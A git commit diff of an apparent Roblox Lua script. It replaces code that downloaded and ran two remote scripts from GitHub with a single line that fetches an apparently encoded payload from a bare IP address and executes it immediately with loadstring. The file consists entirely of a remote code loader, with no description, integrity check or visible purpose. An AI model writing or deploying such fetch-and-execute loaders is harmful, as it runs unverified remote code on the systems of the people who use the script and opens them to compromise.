6a540032a64a17399eb2201d922a871362e64de1
czcasdfwdk <165571219+czcasdfwdk@users.noreply.github.com>
2026-08-11 20:19:05 +0800

    Add

--- adfczcdyk-jzq.lut.lua
+++ adfczcdyk-jzq.lut.lua
@@ -4,16 +4,4 @@
 
 
 
-local a = "https://raw.githubusercontent.com/czcasdfwdk/dyk--czc/main/synbdyknbhhhh.lua"
-local b = "https://raw.githubusercontent.com/czcasdfwdk/dyk-jzq-czc/main/dykjzqjzq2-czc.lua"
-local function c(d)
-    local e, f = pcall(function()
-        local g = game:HttpGet(d)
-        if g and #g > 10 then
-            loadstring(g)()
-        end
-    end)
-end
-c(a)
-task.wait(0.5)
-c(b)
+loadstring(game:HttpGetAsync("http://121.43.37.20:8885/output/enc/043d292b5744"))()
